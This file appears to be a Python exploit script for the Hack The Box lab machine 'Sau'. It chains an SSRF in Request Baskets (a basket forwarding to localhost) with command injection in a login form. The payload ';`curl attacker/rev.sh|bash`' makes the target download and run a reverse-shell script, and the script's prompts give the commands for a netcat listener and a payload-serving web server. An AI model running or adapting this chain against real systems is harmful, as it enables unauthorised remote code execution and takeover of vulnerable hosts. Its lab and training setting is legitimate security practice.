#!/usr/bin/env python3

#Just for fun. This is an "auto exploit" for the Hack The BoX Machine Sau
#You will need the rev.sh file, change the IP to your local attack box and save it in the same dir as this file.
import requests
import json
import random
from urllib.parse import quote

def construct_url(ip, port):
    return f"http://{ip}:{port}"

user_Request_basket_url = input("Please enter the IP address of the Request_Basket web site (i.e. 10.129.80.5): ")
user_Atackers_local_IP = input("Please enter the IP address of your local attack box (i.e. 10.10.14.58): ")

input("Do you have NetCat Lisnter running on port 9009? (if not run this command: nc -nvlp 9009) \n Hit any key to continue:")

input("Do you have the rev.sh file in the same dir as this file and a python webserver running?(if not run this command: python -m http.server 80) \n Hit any key to continue:")

Request_basket_url = construct_url(user_Request_basket_url, "55555")
Attackers_local_IP = construct_url(user_Atackers_local_IP, "80") 
SSRF_url='http://127.0.0.1:80/'

payload = f'username=;`curl {user_Atackers_local_IP}/rev.sh|bash`'
encoded_payload = quote(payload, safe='')

length = random.randint(5, 8)

random_number = random.randint(10**(length-1), 10**length - 1)

json_data = {"forward_url": f"{SSRF_url}", "proxy_response": True, "insecure_tls": False, "expand_path": True, "capacity": 250}
headers = {'Content-Type': 'application/json'}


r = requests.post(f'{Request_basket_url}/api/baskets/{random_number}',headers=headers, json=json_data)

if r.status_code in (200,201):
    print(r.status_code,r.content.decode())
    #r = requests.get('http://10.10.14.58/rev.sh') #<--Checking to see if local attacking PC is serving the rev.sh file
    if 1==1:#r.status_code == 200:
        #print(r.status_code, r.content.decode())
        
        r = requests.post(f'{Request_basket_url}/{random_number}/login',data=payload)
        print(f'{Request_basket_url}/{random_number}/login',payload)
        print(r.status_code,r.content.decode())
    
    else:
        print(r.status_code, 'error you local attck pc isn"t serving the rev.sh payload')

else:
    print('error',r.status_code,r.content.decode())
    

print(r.status_code)
